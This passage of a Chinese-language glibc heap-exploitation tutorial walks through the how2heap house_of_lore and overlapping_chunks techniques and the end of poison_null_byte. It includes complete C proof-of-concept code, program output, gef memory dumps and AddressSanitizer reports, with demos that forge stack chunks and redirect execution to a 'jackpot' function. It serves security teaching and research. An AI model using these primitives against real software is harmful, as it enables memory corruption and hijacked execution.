0x603140: 0x0000000000000000 0x0000000000020ec1 <-- top chunk gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[1]: fw=0x603100, bk=0x603100 \u2192 Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE) \u8fd8\u6709\u4e2a\u4e8b\u60c5\u503c\u5f97\u6ce8\u610f\uff0c\u5728\u5206\u914d chunk d \u65f6\uff0c\u7531\u4e8e\u5728 unsorted bin \u4e2d\u6ca1\u6709\u627e\u5230\u9002\u5408\u7684 chunk\uff0cmalloc \u5c31\u5c06 unsorted bin \u4e2d\u7684 chunk \u90fd\u6574\u7406\u56de\u5404\u81ea\u7684 bins \u4e2d\u4e86\uff0c\u8fd9\u91cc\u5c31\u662f small bins\u3002 \u6700\u540e\uff0c\u7ee7\u7eed\u770b libc-2.26 \u4e0a\u7684\u60c5\u51b5\uff0c\u8fd8\u662f\u4e00\u6837\u7684\uff0c\u5904\u7406\u597d tchache \u5c31\u53ef\u4ee5\u4e86\uff0c\u628a\u4e24\u79cd\u5927\u5c0f\u7684 tcache bin \u90fd\u5360\u6ee1\u3002 heap-buffer-overflow\uff0c\u4f46\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0c\u52a0\u4e86\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u540e\uff0creal size \u53ea\u80fd\u662f\u6b63\u5e38\u7684 0x10 \u4e86\u3002 $ gcc -fsanitize=address -g poison_null_byte.c $ ./a.out We allocate 0x10 bytes for 'a': 0x60200000eff0 'real' size of 'a': 0x10 b: 0x611000009f00 c: 0x60c00000bf80 ================================================================= ==2369==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009ef8 at pc 0x000000400be0 bp 0x7ffe7826e9a0 sp 0x7ffe7826e990 READ of size 8 at 0x611000009ef8 thread T0 #0 0x400bdf in main /home/firmy/how2heap/poison_null_byte.c:22 #1 0x7f47d8fe382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #2 0x400978 in _start (/home/firmy/how2heap/a.out+0x400978) 0x611000009ef8 is located 8 bytes to the left of 256-byte region [0x611000009f00,0x61100000a000) allocated by thread T0 here: #0 0x7f47d9425602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602) #1 0x400af1 in main /home/firmy/how2heap/poison_null_byte.c:15 #2 0x7f47d8fe382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) house_of_lore #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> void jackpot(){ puts(\"Nice jump d00d\"); exit(0); } int main() { intptr_t *victim = malloc(0x80); memset(victim, 'A', 0x80); void *p5 = malloc(0x10); memset(p5, 'A', 0x10); intptr_t *victim_chunk = victim - 2; fprintf(stderr, \"Allocated the victim (small) chunk: %p\\n\", victim); intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[3] = {0}; stack_buffer_1[0] = 0; stack_buffer_1[2] = victim_chunk; stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr, \"stack_buffer_1: %p\\n\", (void*)stack_buffer_1); fprintf(stderr, \"stack_buffer_2: %p\\n\\n\", (void*)stack_buffer_2); free((void*)victim); fprintf(stderr, \"Freeing the victim chunk %p, it will be inserted in the unsorted bin\\n\", victim); fprintf(stderr, \"victim->fd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim->bk: %p\\n\\n\", (void *)victim[1]); void *p2 = malloc(0x100); fprintf(stderr, \"Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\\n\", p2); fprintf(stderr, \"The victim chunk %p will be inserted in front of the SmallBin\\n\", victim); fprintf(stderr, \"victim->fd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim->bk: %p\\n\\n\", (void *)victim[1]); victim[1] = (intptr_t)stack_buffer_1; fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim->bk pointer\\n\"); void *p3 = malloc(0x40); char *p4 = malloc(0x80); memset(p4, 'A', 0x10); fprintf(stderr, \"This last malloc should return a chunk at the position injected in bin->bk: %p\\n\", p4); fprintf(stderr, \"The fd pointer of stack_buffer_2 has changed: %p\\n\\n\", stack_buffer_2[2]); intptr_t sc = (intptr_t)jackpot; memcpy((p4+40), &sc, 8); } $ gcc -g house_of_lore.c $ ./a.out Allocated the victim (small) chunk: 0x1b2e010 stack_buffer_1: 0x7ffe5c570350 stack_buffer_2: 0x7ffe5c570330 Freeing the victim chunk 0x1b2e010, it will be inserted in the unsorted bin victim->fd: 0x7f239d4c9b78 victim->bk: 0x7f239d4c9b78 Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x1b2e0c0 The victim chunk 0x1b2e010 will be inserted in front of the SmallBin victim->fd: 0x7f239d4c9bf8 victim->bk: 0x7f239d4c9bf8 Now emulating a vulnerability that can overwrite the victim->bk pointer This last malloc should return a chunk at the position injected in bin->bk: 0x7ffe5c570360 The fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8 Nice jump d00d \u5728\u524d\u9762\u7684\u6280\u672f\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u600e\u6837\u53bb\u4f2a\u9020\u4e00\u4e2a fake chunk\uff0c\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u8981\u5c1d\u8bd5\u4f2a\u9020\u4e00\u6761 small bins \u94fe\u3002 \u9996\u5148\u521b\u5efa\u4e24\u4e2a chunk\uff0c\u7b2c\u4e00\u4e2a\u662f\u6211\u4eec\u7684 victim chunk\uff0c\u8bf7\u786e\u4fdd\u5b83\u662f\u4e00\u4e2a small chunk\uff0c\u7b2c\u4e8c\u4e2a\u968f\u610f\uff0c\u53ea\u662f\u4e3a\u4e86\u786e\u4fdd\u5728 free \u65f6 victim chunk \u4e0d\u4f1a\u88ab\u5408\u5e76\u8fdb top chunk \u91cc\u3002\u7136\u540e\uff0c\u5728\u6808\u4e0a\u4f2a\u9020\u4e24\u4e2a fake chunk\uff0c\u8ba9 fake chunk 1 \u7684 fd \u6307\u5411 victim chunk\uff0cbk \u6307\u5411 fake chunk 2\uff1bfake chunk 2 \u7684 fd \u6307\u5411 fake chunk 1\uff0c\u8fd9\u6837\u4e00\u4e2a small bin \u94fe\u5c31\u5dee\u4e0d\u591a\u4e86\uff1a gef\u27a4 x/26gx victim-2 0x603000: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x603010: 0x4141414141414141 0x4141414141414141 0x603020: 0x4141414141414141 0x4141414141414141 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x0000000000000000 0x0000000000000021 <-- chunk p5 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000020f51 <-- top chunk 0x6030c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/10gx &stack_buffer_2 0x7fffffffdc30: 0x0000000000000000 0x0000000000000000 <-- fake chunk 2 0x7fffffffdc40: 0x00007fffffffdc50 0x0000000000400aed <-- fd->fake chunk 1 0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 <-- fake chunk 1 0x7fffffffdc60: 0x0000000000603000 0x00007fffffffdc30 <-- fd->victim chunk, bk->fake chunk 2 0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00 molloc \u4e2d\u5bf9\u4e8e small bin \u94fe\u8868\u7684\u68c0\u67e5\u662f\u8fd9\u6837\u7684\uff1a [...] else { bck = victim->bk; if (__glibc_unlikely (bck->fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset (victim, nb); bin->bk = bck; bck->fd = bin; [...] \u5373\u68c0\u67e5 bin \u4e2d\u7b2c\u4e8c\u5757\u7684 bk \u6307\u9488\u662f\u5426\u6307\u5411\u7b2c\u4e00\u5757\uff0c\u6765\u53d1\u73b0\u5bf9 small bins \u7684\u7834\u574f\u3002\u4e3a\u4e86\u7ed5\u8fc7\u8fd9\u4e2a\u68c0\u67e5\uff0c\u6240\u4ee5\u624d\u9700\u8981\u540c\u65f6\u4f2a\u9020 bin \u4e2d\u7684\u524d 2 \u4e2a chunk\u3002 \u63a5\u4e0b\u6765\u91ca\u653e\u6389 victim chunk\uff0c\u5b83\u4f1a\u88ab\u653e\u5230 unsoted bin \u4e2d\uff0c\u4e14 fd/bk \u5747\u6307\u5411 unsorted bin \u7684\u5934\u90e8\uff1a gef\u27a4 x/26gx victim-2 0x603000: 0x0000000000000000 0x0000000000000091 <-- victim chunk [be freed] 0x603010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603020: 0x4141414141414141 0x4141414141414141 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x0000000000000090 0x0000000000000020 <-- chunk p5 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000020f51 <-- top chunk 0x6030c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603000, bk=0x603000 \u2192 Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE) \u8fd9\u65f6\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u7684 chunk\uff0c\u53ea\u9700\u8981\u5927\u5230\u8ba9 malloc \u5728 unsorted bin \u4e2d\u627e\u4e0d\u5230\u5408\u9002\u7684\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u6837\u539f\u672c\u5728 unsorted bin \u4e2d\u7684 chunk\uff0c\u4f1a\u88ab\u6574\u7406\u56de\u5404\u81ea\u7684\u6240\u5c5e\u7684 bins \u4e2d\uff0c\u8fd9\u91cc\u5c31\u662f small bins\uff1a gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[8]: fw=0x603000, bk=0x603000 \u2192 Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE) \u63a5\u4e0b\u6765\u662f\u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u5047\u8bbe\u5b58\u5728\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u4fee\u6539 victim chunk \u7684 bk \u6307\u9488\u3002\u90a3\u4e48\u5c31\u4fee\u6539 bk \u8ba9\u5b83\u6307\u5411\u6211\u4eec\u5728\u6808\u4e0a\u5e03\u7f6e\u7684 fake small bin\uff1a gef\u27a4 x/26gx victim-2 0x603000: 0x0000000000000000 0x0000000000000091 <-- victim chunk [be freed] 0x603010: 0x00007ffff7dd1bf8 0x00007fffffffdc50 <-- bk->fake chunk 1 0x603020: 0x4141414141414141 0x4141414141414141 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x4141414141414141 0x603060: 0x4141414141414141 0x4141414141414141 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x0000000000000090 0x0000000000000020 <-- chunk p5 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000000111 <-- chunk p2 0x6030c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/10gx &stack_buffer_2 0x7fffffffdc30: 0x0000000000000000 0x0000000000000000 <-- fake chunk 2 0x7fffffffdc40: 0x00007fffffffdc50 0x0000000000400aed <-- fd->fake chunk 1 0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 <-- fake chunk 1 0x7fffffffdc60: 0x0000000000603000 0x00007fffffffdc30 <-- fd->victim chunk, bk->fake chunk 2 0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00 \u6211\u4eec\u77e5\u9053 small bins \u662f\u5148\u8fdb\u540e\u51fa\u7684\uff0c\u8282\u70b9\u7684\u589e\u52a0\u53d1\u751f\u5728\u94fe\u8868\u5934\u90e8\uff0c\u800c\u5220\u9664\u53d1\u751f\u5728\u5c3e\u90e8\u3002\u8fd9\u65f6\u6574\u6761\u94fe\u662f\u8fd9\u6837\u7684\uff1a HEAD(undefined) <-> fake chunk 2 <-> fake chunk 1 <-> victim chunk <-> TAIL fd: -> bk: <- fake chunk 2 \u7684 bk \u6307\u5411\u4e86\u4e00\u4e2a\u672a\u5b9a\u4e49\u7684\u5730\u5740\uff0c\u5982\u679c\u80fd\u901a\u8fc7\u5185\u5b58\u6cc4\u9732\u7b49\u624b\u6bb5\uff0c\u62ff\u5230 HEAD \u7684\u5730\u5740\u5e76\u586b\u8fdb\u53bb\uff0c\u6574\u6761\u94fe\u5c31\u95ed\u5408\u4e86\u3002\u5f53\u7136\u8fd9\u91cc\u5b8c\u5168\u6ca1\u6709\u5fc5\u8981\u8fd9\u4e48\u505a\u3002 \u63a5\u4e0b\u6765\u7684\u7b2c\u4e00\u4e2a malloc\uff0c\u4f1a\u8fd4\u56de victim chunk \u7684\u5730\u5740\uff0c\u5982\u679c malloc \u7684\u5927\u5c0f\u6b63\u597d\u7b49\u4e8e victim chunk \u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u60c5\u51b5\u4f1a\u7b80\u5355\u4e00\u70b9\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u4e0d\u8fd9\u6837\u505a\uff0cmalloc \u4e00\u4e2a\u5c0f\u4e00\u70b9\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\uff0cmalloc \u4ece small bin \u91cc\u53d6\u51fa\u4e86\u672b\u5c3e\u7684 victim chunk\uff0c\u5207\u4e86\u4e00\u5757\u8fd4\u56de\u7ed9 chunk p3\uff0c\u7136\u540e\u628a\u5269\u4e0b\u7684\u90e8\u5206\u653e\u56de\u5230\u4e86 unsorted bin\u3002\u540c\u65f6 small bin \u53d8\u6210\u4e86\u8fd9\u6837\uff1a HEAD(undefined) <-> fake chunk 2 <-> fake chunk 1 <-> TAIL gef\u27a4 x/26gx victim-2 0x603000: 0x0000000000000000 0x0000000000000051 <-- chunk p3 0x603010: 0x00007ffff7dd1bf8 0x00007fffffffdc50 0x603020: 0x4141414141414141 0x4141414141414141 0x603030: 0x4141414141414141 0x4141414141414141 0x603040: 0x4141414141414141 0x4141414141414141 0x603050: 0x4141414141414141 0x0000000000000041 <-- unsorted bin 0x603060: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x603070: 0x4141414141414141 0x4141414141414141 0x603080: 0x4141414141414141 0x4141414141414141 0x603090: 0x0000000000000040 0x0000000000000020 <-- chunk p5 0x6030a0: 0x4141414141414141 0x4141414141414141 0x6030b0: 0x0000000000000000 0x0000000000000111 <-- chunk p2 0x6030c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/10gx &stack_buffer_2 0x7fffffffdc30: 0x0000000000000000 0x0000000000000000 <-- fake chunk 2 0x7fffffffdc40: 0x00007fffffffdc50 0x0000000000400aed <-- fd->fake chunk 1 0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 <-- fake chunk 1 0x7fffffffdc60: 0x00007ffff7dd1bf8 0x00007fffffffdc30 <-- fd->TAIL, bk->fake chunk 2 0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x603050, bk=0x603050 \u2192 Chunk(addr=0x603060, size=0x40, flags=PREV_INUSE) \u6700\u540e\uff0c\u518d\u6b21 malloc \u5c06\u8fd4\u56de fake chunk 1 \u7684\u5730\u5740\uff0c\u5730\u5740\u5728\u6808\u4e0a\u4e14\u6211\u4eec\u80fd\u591f\u63a7\u5236\u3002\u540c\u65f6 small bin \u53d8\u6210\u8fd9\u6837\uff1a HEAD(undefined) <-> fake chunk 2 <-> TAIL gef\u27a4 x/10gx &stack_buffer_2 0x7fffffffdc30: 0x0000000000000000 0x0000000000000000 <-- fake chunk 2 0x7fffffffdc40: 0x00007ffff7dd1bf8 0x0000000000400aed <-- fd->TAIL 0x7fffffffdc50: 0x0000000000000000 0x0000000000000000 <-- chunk 4 0x7fffffffdc60: 0x4141414141414141 0x4141414141414141 0x7fffffffdc70: 0x00007fffffffdd60 0x7c008088c400bc00 \u4e8e\u662f\u6211\u4eec\u5c31\u6210\u529f\u5730\u9a97\u8fc7\u4e86 malloc \u5728\u6808\u4e0a\u5206\u914d\u4e86\u4e00\u4e2a chunk\u3002 \u6700\u540e\u518d\u60f3\u4e00\u4e0b\uff0c\u5176\u5b9e\u6700\u521d\u7684 victim chunk \u4f7f\u7528 fast chunk \u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u5176\u91ca\u653e\u540e\u867d\u7136\u662f\u88ab\u52a0\u5165\u5230 fast bins \u4e2d\uff0c\u800c\u4e0d\u662f unsorted bin\uff0c\u4f46 malloc \u4e4b\u540e\uff0c\u4e5f\u4f1a\u88ab\u6574\u7406\u5230 small bins \u91cc\u3002\u81ea\u884c\u5c1d\u8bd5\u5427\u3002 heap-use-after-free\uff0c\u6240\u4ee5\u4e0a\u9762\u6211\u4eec\u7528\u4e8e\u4fee\u6539 bk \u6307\u9488\u7684\u6f0f\u6d1e\uff0c\u5e94\u8be5\u5c31\u662f\u4e00\u4e2a UAF \u5427\uff0c\u5f53\u7136\u6ea2\u51fa\u4e5f\u662f\u53ef\u4ee5\u7684\uff1a $ gcc -fsanitize=address -g house_of_lore.c $ ./a.out Allocated the victim (small) chunk: 0x60c00000bf80 stack_buffer_1: 0x7ffd1fbc5cd0 stack_buffer_2: 0x7ffd1fbc5c90 Freeing the victim chunk 0x60c00000bf80, it will be inserted in the unsorted bin ================================================================= ==6034==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c00000bf80 at pc 0x000000400eec bp 0x7ffd1fbc5bf0 sp 0x7ffd1fbc5be0 READ of size 8 at 0x60c00000bf80 thread T0 #0 0x400eeb in main /home/firmy/how2heap/house_of_lore.c:27 #1 0x7febee33c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #2 0x400b38 in _start (/home/firmy/how2heap/a.out+0x400b38) \u6700\u540e\u518d\u7ed9\u4e00\u4e2a libc-2.27 \u7248\u672c\u7684\uff1a #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> void jackpot(){ puts(\"Nice jump d00d\"); exit(0); } int main() { intptr_t *victim = malloc(0x80); // fill the tcache int *a[10]; int i; for (i = 0; i < 7; i++) { a[i] = malloc(0x80); } for (i = 0; i < 7; i++) { free(a[i]); } memset(victim, 'A', 0x80); void *p5 = malloc(0x10); memset(p5, 'A', 0x10); intptr_t *victim_chunk = victim - 2; fprintf(stderr, \"Allocated the victim (small) chunk: %p\\n\", victim); intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[6] = {0}; stack_buffer_1[0] = 0; stack_buffer_1[2] = victim_chunk; stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; stack_buffer_2[3] = (intptr_t*)stack_buffer_1; // 3675 bck->fd = bin; fprintf(stderr, \"stack_buffer_1: %p\\n\", (void*)stack_buffer_1); fprintf(stderr, \"stack_buffer_2: %p\\n\\n\", (void*)stack_buffer_2); free((void*)victim); fprintf(stderr, \"Freeing the victim chunk %p, it will be inserted in the unsorted bin\\n\", victim); fprintf(stderr, \"victim->fd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim->bk: %p\\n\\n\", (void *)victim[1]); void *p2 = malloc(0x100); fprintf(stderr, \"Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\\n\", p2); fprintf(stderr, \"The victim chunk %p will be inserted in front of the SmallBin\\n\", victim); fprintf(stderr, \"victim->fd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim->bk: %p\\n\\n\", (void *)victim[1]); victim[1] = (intptr_t)stack_buffer_1; fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim->bk pointer\\n\"); void *p3 = malloc(0x40); // empty the tcache for (i = 0; i < 7; i++) { a[i] = malloc(0x80); } char *p4 = malloc(0x80); memset(p4, 'A', 0x10); fprintf(stderr, \"This last malloc should return a chunk at the position injected in bin->bk: %p\\n\", p4); fprintf(stderr, \"The fd pointer of stack_buffer_2 has changed: %p\\n\\n\", stack_buffer_2[2]); intptr_t sc = (intptr_t)jackpot; memcpy((p4+0xa8), &sc, 8); } $ gcc -g house_of_lore.c $ ./a.out Allocated the victim (small) chunk: 0x55674d75f260 stack_buffer_1: 0x7ffff71fb1d0 stack_buffer_2: 0x7ffff71fb1f0 Freeing the victim chunk 0x55674d75f260, it will be inserted in the unsorted bin victim->fd: 0x7f1eba392b00 victim->bk: 0x7f1eba392b00 Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x55674d75f700 The victim chunk 0x55674d75f260 will be inserted in front of the SmallBin victim->fd: 0x7f1eba392b80 victim->bk: 0x7f1eba392b80 Now emulating a vulnerability that can overwrite the victim->bk pointer This last malloc should return a chunk at the position injected in bin->bk: 0x7ffff71fb1e0 The fd pointer of stack_buffer_2 has changed: 0x7ffff71fb1e0 Nice jump d00d overlapping_chunks #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> int main() { intptr_t *p1,*p2,*p3,*p4; p1 = malloc(0x90 - 8); p2 = malloc(0x90 - 8); p3 = malloc(0x80 - 8); memset(p1, 'A', 0x90 - 8); memset(p2, 'A', 0x90 - 8); memset(p3, 'A', 0x80 - 8); fprintf(stderr, \"Now we allocate 3 chunks on the heap\\n\"); fprintf(stderr, \"p1=%p\\np2=%p\\np3=%p\\n\\n\", p1, p2, p3); free(p2); fprintf(stderr, \"Freeing the chunk p2\\n\"); int evil_chunk_size = 0x111; int evil_region_size = 0x110 - 8; *(p2-1) = evil_chunk_size; // Overwriting the \"size\" field of chunk p2 fprintf(stderr, \"Emulating an overflow that can overwrite the size of the chunk p2.\\n\\n\"); p4 = malloc(evil_region_size); fprintf(stderr, \"p4: %p ~ %p\\n\", p4, p4+evil_region_size); fprintf(stderr, \"p3: %p ~ %p\\n\", p3, p3+0x80); fprintf(stderr, \"\\nIf we memset(p4, 'B', 0xd0), we have:\\n\"); memset(p4, 'B', 0xd0); fprintf(stderr, \"p4 = %s\\n\", (char *)p4); fprintf(stderr, \"p3 = %s\\n\", (char *)p3); fprintf(stderr, \"\\nIf we memset(p3, 'C', 0x50), we have:\\n\"); memset(p3, 'C', 0x50); fprintf(stderr, \"p4 = %s\\n\", (char *)p4); fprintf(stderr, \"p3 = %s\\n\", (char *)p3); } $ gcc -g overlapping_chunks.c $ ./a.out Now we allocate 3 chunks on the heap p1=0x1e2b010 p2=0x1e2b0a0 p3=0x1e2b130 Freeing the chunk p2 Emulating an overflow that can overwrite the size of the chunk p2. p4: 0x1e2b0a0 ~ 0x1e2b8e0 p3: 0x1e2b130 ~ 0x1e2b530 If we memset(p4, 'B', 0xd0), we have: p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa p3 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa If we memset(p3, 'C', 0x50), we have: p4 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa p3 = CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa \u8fd9\u4e2a\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u5806\u5757\u91cd\u53e0\u7684\u95ee\u9898\u3002\u901a\u8fc7\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6539\u5199 unsorted bin \u4e2d\u7a7a\u95f2\u5806\u5757\u7684 size\uff0c\u6539\u53d8\u4e0b\u4e00\u6b21 malloc \u53ef\u4ee5\u8fd4\u56de\u7684\u5806\u5757\u5927\u5c0f\u3002 \u9996\u5148\u5206\u914d\u4e09\u4e2a\u5806\u5757\uff0c\u7136\u540e\u91ca\u653e\u6389\u4e2d\u95f4\u7684\u4e00\u4e2a\uff1a gef\u27a4 x/60gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x4141414141414141 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141 0x602050: 0x4141414141414141 0x4141414141414141 0x602060: 0x4141414141414141 0x4141414141414141 0x602070: 0x4141414141414141 0x4141414141414141 0x602080: 0x4141414141414141 0x4141414141414141 0x602090: 0x4141414141414141 0x0000000000000091 <-- chunk 2 [be freed] 0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6020b0: 0x4141414141414141 0x4141414141414141 0x6020c0: 0x4141414141414141 0x4141414141414141 0x6020d0: 0x4141414141414141 0x4141414141414141 0x6020e0: 0x4141414141414141 0x4141414141414141 0x6020f0: 0x4141414141414141 0x4141414141414141 0x602100: 0x4141414141414141 0x4141414141414141 0x602110: 0x4141414141414141 0x4141414141414141 0x602120: 0x0000000000000090 0x0000000000000080 <-- chunk 3 0x602130: 0x4141414141414141 0x4141414141414141 0x602140: 0x4141414141414141 0x4141414141414141 0x602150: 0x4141414141414141 0x4141414141414141 0x602160: 0x4141414141414141 0x4141414141414141 0x602170: 0x4141414141414141 0x4141414141414141 0x602180: 0x4141414141414141 0x4141414141414141 0x602190: 0x4141414141414141 0x4141414141414141 0x6021a0: 0x4141414141414141 0x0000000000020e61 <-- top chunk 0x6021b0: 0x0000000000000000 0x0000000000000000 0x6021c0: 0x0000000000000000 0x0000000000000000 0x6021d0: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602090, bk=0x602090 \u2192 Chunk(addr=0x6020a0, size=0x90, flags=PREV_INUSE) chunk 2 \u88ab\u653e\u5230\u4e86 unsorted bin \u4e2d\uff0c\u5176 size \u503c\u4e3a 0x90\u3002 \u63a5\u4e0b\u6765\uff0c\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 chunk 2 \u7684 size \u503c\uff0c\u6bd4\u5982\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u6539\u4e3a 0x111\uff0c\u4e5f\u5c31\u662f\u539f\u672c chunk 2 \u548c chunk 3 \u7684\u5927\u5c0f\u76f8\u52a0\uff0c\u6700\u540e\u4e00\u4f4d\u662f 1 \u8868\u793a chunk 1 \u662f\u5728\u4f7f\u7528\u7684\uff0c\u5176\u5b9e\u6709\u6ca1\u6709\u90fd\u65e0\u6240\u8c13\u3002 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602090, bk=0x602090 \u2192 Chunk(addr=0x6020a0, size=0x110, flags=PREV_INUSE) \u8fd9\u65f6 unsorted bin \u4e2d\u7684\u6570\u636e\u4e5f\u66f4\u6539\u4e86\u3002 \u63a5\u4e0b\u6765 malloc \u4e00\u4e2a\u5927\u5c0f\u7684\u7b49\u4e8e chunk 2 \u548c chunk 3 \u4e4b\u548c\u7684 chunk 4\uff0c\u8fd9\u4f1a\u5c06 chunk 2 \u548c chunk 3 \u90fd\u5305\u542b\u8fdb\u6765\uff1a gef\u27a4 x/60gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x4141414141414141 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141 0x602050: 0x4141414141414141 0x4141414141414141 0x602060: 0x4141414141414141 0x4141414141414141 0x602070: 0x4141414141414141 0x4141414141414141 0x602080: 0x4141414141414141 0x4141414141414141 0x602090: 0x4141414141414141 0x0000000000000111 <-- chunk 4 0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x6020b0: 0x4141414141414141 0x4141414141414141 